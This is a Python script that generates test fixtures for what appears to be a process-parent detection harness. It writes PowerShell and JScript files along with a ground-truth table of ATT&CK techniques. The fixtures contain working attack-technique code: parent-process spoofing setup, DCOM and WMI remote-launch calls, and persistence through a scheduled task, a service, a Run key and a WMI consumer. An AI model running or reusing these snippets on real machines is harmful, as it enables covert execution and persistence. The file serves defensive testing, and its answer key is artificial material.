"""Spawn-API proxy-parent fixtures (target spawn-api-parent-table). Stdlib writers only: base64.b64encode / bytes.hex
for the plan literal, hand-written spawn / PPID-spoof code around it. TRUTH_* is what this script wrote (which broker
the OS will record as the parent of each launch, per Microsoft docs / Sysmon behaviour), not what lib/codec.py reads.
Run: python3 -I spawnpar_gen.py <outdir>"""
import base64
import json
import sys
from pathlib import Path

OUT = Path(sys.argv[1])
P_SPOOF = ("v=3|language=powershell|role=loader|verdict=malicious|attack=T1134.004|adapter=win32_api|"
           "stage_count=1|steps=open_parent,spoof_parent,dispatch_process|campaign_id=PP-7d31c0e2|"
           "next_stage=C:\\Users\\Public\\pp7d.exe")
P_DCOM = ("v=3|language=jscript|role=lateral|verdict=malicious|attack=T1021.003|adapter=dcom|host_profile=standalone|"
          "stage_count=2|steps=dcom_mmc20,dcom_shellwindows,wmi_create|campaign_id=DC-41a9be07")
P_PERS = ("v=3|language=powershell|role=persistence|verdict=malicious|attack=T1053.005|adapter=task_scheduler|"
          "stage_count=3|steps=register_task,create_service,run_key,wmi_consumer|campaign_id=PS-93ce0b5a")

SPOOF_PS1 = r"""# lab shim: parent-process spoof (inert, never executed in the harness)
$Codec_7d31 = 'base64|identity|'
$Material_7d31 = '%s'
Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public static class Pp {
  [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFOEX { public STARTUPINFO StartupInfo; public IntPtr lpAttributeList; }
  [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; }
  [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int pid);
  [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(IntPtr l, int c, int f, ref IntPtr s);
  [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(IntPtr l, uint f, IntPtr attr, IntPtr v, IntPtr cb, IntPtr p, IntPtr r);
  [DllImport("kernel32.dll")] public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool ih, uint flags, IntPtr env, string dir, ref STARTUPINFOEX si, out IntPtr pi);
}
"@
$parent = Get-Process explorer | Select-Object -First 1
$h = [Pp]::OpenProcess(0x0080, $false, $parent.Id)
$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
$EXTENDED_STARTUPINFO_PRESENT = 0x00080000
"""

DCOM_JS = r"""// lab shim: DCOM / WMI launch (inert)
var Codec_41a9 = "hex|identity|";
var Material_41a9 = "%s";
var mmc = GetObject("new:49B2791A-B1AE-4C90-9B8E-E860BA07F889");
mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe", null, "/c C:\\Users\\Public\\dc41.bat", "7");
var sw = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39");
sw.Item().Document.Application.ShellExecute("rundll32.exe", "C:\\Users\\Public\\dc41.dll,Start", "C:\\Windows\\System32", null, 0);
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process");
wmi.Create("powershell.exe -NoP -File C:\\Users\\Public\\dc41.ps1", null, null, 0);
"""

PERS_PS1 = r"""# lab shim: persistence through brokers (inert)
$Codec_93ce = 'base64|identity|'
$Material_93ce = '%s'
$a = New-ScheduledTaskAction -Execute "C:\Users\Public\ps93.exe" -Argument "-silent"
Register-ScheduledTask -TaskName "Updater93" -Action $a -Trigger (New-ScheduledTaskTrigger -AtLogOn)
sc.exe create Upd93 binPath= "C:\Users\Public\svc93.exe" start= auto
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Upd93 -Value "C:\Users\Public\run93.exe"
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="c93"; CommandLineTemplate="C:\Users\Public\wmi93.exe"}
"""

DECOY_PS1 = r"""# notes on detection only -- nothing here launches or persists anything
$Codec_00d1 = 'base64|identity|'
$Material_00d1 = '%s'
# UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_PARENT_PROCESS STARTUPINFOEX CreateProcess
# schtasks /create /tn x /tr calc.exe ; Win32_Process Create ; MMC20.Application ExecuteShellCommand
Write-Host "Watch for WmiPrvSE.exe spawning powershell and services.exe spawning sc-created services"
"""
NOT_A_PLAN = b"theme=dark|font=Consolas|autosave=on|interval=300|window=Terminal|telemetry=off"


def b64(s):
    return base64.b64encode(s if isinstance(s, bytes) else s.encode()).decode()


(OUT / "spawnpar_ps_ppid_spoof.ps1").write_text(SPOOF_PS1 % b64(P_SPOOF), newline="\n")
(OUT / "spawnpar_js_dcom_wmi.js").write_text(DCOM_JS % P_DCOM.encode().hex(), newline="\n")
(OUT / "spawnpar_ps_persist_brokers.ps1").write_text(PERS_PS1 % b64(P_PERS), newline="\n")
(OUT / "spawnpar_decoy_comments.ps1").write_text(DECOY_PS1 % b64(NOT_A_PLAN), newline="\n")
TRUTH = {
    "spawnpar_ps_ppid_spoof": {"plain": P_SPOOF, "parent": "explorer.exe", "attack": ["T1134.004"]},
    "spawnpar_js_dcom_wmi": {"plain": P_DCOM, "parent": ["mmc.exe", "explorer.exe", "WmiPrvSE.exe"],
                             "attack": ["T1021.003", "T1559.001", "T1047"],
                             "spawns": [["mmc.exe", "cmd.exe", 5], ["explorer.exe", "rundll32.exe", 7],
                                        ["WmiPrvSE.exe", "powershell.exe", 9]]},
    "spawnpar_ps_persist_brokers": {"plain": P_PERS,
                                    "parent": ["svchost.exe", "taskeng.exe", "services.exe", "explorer.exe",
                                               "userinit.exe", "WmiPrvSE.exe"],
                                    "attack": ["T1053.005", "T1543.003", "T1547.001", "T1546.003"],
                                    "spawns": [["svchost.exe", "C:\\Users\\Public\\ps93.exe", 4],
                                               ["services.exe", "C:\\Users\\Public\\svc93.exe", 6],
                                               ["WmiPrvSE.exe", "C:\\Users\\Public\\wmi93.exe", 8]]},
    "spawnpar_decoy_comments": {"plain": None, "parent": "none", "attack": "none"},
}
print(json.dumps(TRUTH, indent=1))
